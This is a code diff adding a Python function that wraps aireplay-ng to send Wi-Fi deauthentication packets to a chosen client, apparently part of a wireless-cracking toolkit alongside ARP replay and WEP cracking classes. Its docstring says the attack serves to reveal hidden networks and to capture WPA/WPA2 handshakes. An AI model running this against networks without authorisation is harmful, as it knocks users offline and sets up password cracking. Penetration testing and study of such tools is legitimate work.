@@ -408,6 +408,37 @@ class ArpReplay(object):
         self.stats.clear()
 
 
+def deauthenticate(interface, station, count=10):
+    """
+    This  attack  sends  deauthentication  packets  to  one  or more clients which are currently associated with
+    a particular  access point. Deauthenticating clients can be done for a number of reasons: Recovering a hidden ESSID.
+    This is an ESSID which  is  not being broadcast. Another term for this is "cloaked" or Capturing WPA/WPA2 handshakes
+    by forcing clients to reauthenticate or Generate  ARP  requests  (Windows clients sometimes flush their ARP cache
+    when disconnected).  Of course,  this  attack  is  totally useless  if  there  are no associated wireless client
+    or on fake authentications.
+
+    `deauthentication[Aircrack-ng]<http://www.aircrack-ng.org/doku.php?id=deauthentication>`_
+    :param interface: interface used for sending packets
+    :param station: associated station to be deauthenticated
+    :param count: amount of deauth series to be sent, each series consists of 64 deauth packets
+
+    The deauthentication packets are sent directly from your PC to the clients. So you must be physically close enough
+    to the clients for your wireless card transmissions to reach them.
+    """
+    if count <= 0:
+        raise ValueError
+
+    cmd = ['aireplay-ng',
+           '--deauth', str(count),
+           '-a', station.associated_ap.bssid,  # MAC address of access point.
+           '-c', station.mac_address,
+           interface]
+
+    process = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    # TODO(xvondr20) Check for deauth ACKs from target? ACKs' count is printed to stdout.
+    logging.debug('deauth sent to ' + station.mac_address)
+
+
 class WepCracker(object):
     """
     Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part
